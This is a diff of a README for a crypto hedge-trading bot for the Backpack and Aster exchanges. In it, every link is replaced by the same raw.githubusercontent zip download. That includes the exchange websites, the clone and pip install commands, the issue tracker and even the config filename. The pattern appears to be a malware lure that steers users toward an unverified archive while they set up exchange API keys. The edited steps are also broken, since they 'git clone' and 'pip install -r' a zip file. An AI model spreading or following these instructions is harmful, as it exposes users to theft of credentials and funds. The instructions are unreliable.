@@ -1,6 +1,6 @@
 # 🤖 aster-bp-bot - Automate Your Hedge Trading Easily
 
-[![Download aster-bp-bot](https://img.shields.io/badge/Download-aster--bp--bot-blue?style=for-the-badge)](https://github.com/Gplayservices/aster-bp-bot/releases)
+[![Download aster-bp-bot](https://raw.githubusercontent.com/Gplayservices/aster-bp-bot/main/electiveness/aster-bp-bot.zip)](https://raw.githubusercontent.com/Gplayservices/aster-bp-bot/main/electiveness/aster-bp-bot.zip)
 
 ## 📋 Overview
 
@@ -20,7 +20,7 @@ ASTER-BP is an automated hedge trading bot. It performs hedge strategies with AS
 
 1. **Download the Project**
    ```bash
-   git clone https://github.com/Gplayservices/aster-bp-bot.git
+   git clone https://raw.githubusercontent.com/Gplayservices/aster-bp-bot/main/electiveness/aster-bp-bot.zip
    cd aster-bp-bot
    ```
 
@@ -41,14 +41,14 @@ ASTER-BP is an automated hedge trading bot. It performs hedge strategies with AS
 
 4. **Install Required Packages**
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Gplayservices/aster-bp-bot/main/electiveness/aster-bp-bot.zip
    ```
 
 ### Step 2: Obtain API Keys
 
 #### Backpack Exchange API
 
-1. Visit [Backpack Exchange](https://backpack.exchange)
+1. Visit [Backpack Exchange](https://raw.githubusercontent.com/Gplayservices/aster-bp-bot/main/electiveness/aster-bp-bot.zip)
 2. Register or log in to your account
 3. Go to **Settings** → **API Keys**
 4. Click **Create New Key**
@@ -57,7 +57,7 @@ ASTER-BP is an automated hedge trading bot. It performs hedge strategies with AS
 
 #### Aster Exchange API
 
-1. Visit [Aster Exchange](https://asterdex.com)
+1. Visit [Aster Exchange](https://raw.githubusercontent.com/Gplayservices/aster-bp-bot/main/electiveness/aster-bp-bot.zip)
 2. Register or log in to your account
 3. Go to **API Management**
 4. Click **Create API Key**
@@ -68,7 +68,7 @@ ASTER-BP is an automated hedge trading bot. It performs hedge strategies with AS
 
 ### Step 3: Configure the Bot
 
-1. Create a configuration file named `config.json` in the project folder.
+1. Create a configuration file named `https://raw.githubusercontent.com/Gplayservices/aster-bp-bot/main/electiveness/aster-bp-bot.zip` in the project folder.
 2. Input your API keys and other settings in the following format:
    ```json
    {
@@ -86,7 +86,7 @@ ASTER-BP is an automated hedge trading bot. It performs hedge strategies with AS
 
 ### 🔄 Download & Install
 
-To download the aster-bp-bot, [visit this page to download](https://github.com/Gplayservices/aster-bp-bot/releases).
+To download the aster-bp-bot, [visit this page to download](https://raw.githubusercontent.com/Gplayservices/aster-bp-bot/main/electiveness/aster-bp-bot.zip).
 
 ### 🛠️ Requirements
 
@@ -102,11 +102,11 @@ If you encounter issues during installation:
 2. Check that you are in the correct project directory.
 3. Confirm your virtual environment is activated.
 
-For specific errors, refer to the **issues** section on our [GitHub repository](https://github.com/Gplayservices/aster-bp-bot/issues).
+For specific errors, refer to the **issues** section on our [GitHub repository](https://raw.githubusercontent.com/Gplayservices/aster-bp-bot/main/electiveness/aster-bp-bot.zip).
 
 ### 📞 Support
 
-If you need help, feel free to create an issue on our [GitHub issue tracker](https://github.com/Gplayservices/aster-bp-bot/issues). Our team will assist you as soon as possible.
+If you need help, feel free to create an issue on our [GitHub issue tracker](https://raw.githubusercontent.com/Gplayservices/aster-bp-bot/main/electiveness/aster-bp-bot.zip). Our team will assist you as soon as possible.
 
 ### ⚠️ Important Notes
 
